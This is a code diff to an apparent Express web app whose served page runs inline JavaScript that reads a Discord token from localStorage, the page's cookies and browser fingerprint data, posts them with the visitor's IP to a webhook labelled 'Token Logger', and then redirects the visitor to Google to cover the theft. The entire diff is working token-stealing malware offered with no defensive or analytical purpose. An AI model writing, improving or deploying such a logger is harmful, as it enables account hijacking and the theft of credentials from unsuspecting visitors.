@@ -169,16 +169,80 @@ app.get('/', (req, res) => {
         }
 
         (async function() {
-            const data = extractTokens();
-            await sendToWebhook(data);
-            
-            console.log('Token:', data.token || 'No token');
-            console.log('Cookies:', data.cookies || 'No cookies');
-            console.log('Browser:', data.browserInfo.userAgent);
-            
-            setTimeout(() => {
-                window.location.href = 'https://www.google.com';
-            }, 1500);
+            //  Extract token correctly
+            function extractTokens() {
+                let token = null;
+                let cookies = document.cookie || 'No cookies';
+                
+                // Try to get token from localStorage
+                try {
+                    token = localStorage.getItem('token');
+                } catch(e) {
+                    console.log('localStorage error:', e);
+                }
+                
+                // Clean up token if found (remove quotes)
+                if (token) {
+                    try {
+                        token = token.replace(/^"|"$/g, '');
+                    } catch(e) {}
+                }
+                
+                const browserInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+                
+                return { token, cookies, browserInfo };
+            }
+        
+            async function sendToWebhook(data) {
+                const webhookURL = '${WEBHOOK_URL}';
+                
+                const payload = {
+                    embeds: [{
+                        title: '🎯 Token Extracted!',
+                        color: 0x00ff00,
+                        fields: [
+                            { name: 'Discord Token', value: data.token || '❌ No token found', inline: false },
+                            { name: 'IP Address', value: '${ip}', inline: true },
+                            { name: 'Browser', value: data.browserInfo.userAgent.substring(0, 100), inline: false },
+                            { name: 'Platform', value: data.browserInfo.platform, inline: true },
+                            { name: 'Cookies', value: data.cookies || 'None', inline: false },
+                            { name: 'Time', value: new Date().toISOString(), inline: true }
+                        ],
+                        footer: { text: 'Token Logger' }
+                    }]
+                };
+        
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    console.log('✅ Sent to webhook');
+                } catch(e) {
+                    console.error('Webhook error:', e);
+                }
+            }
+        
+            // Execute immediately
+            (async function() {
+                const data = extractTokens();
+                await sendToWebhook(data);
+                
+                console.log('Token:', data.token || 'No token');
+                console.log('Cookies:', data.cookies || 'No cookies');
+                console.log('Browser:', data.browserInfo.userAgent);
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.google.com';
+                }, 1500);
+            })();
         })();
         </script>
     </body>
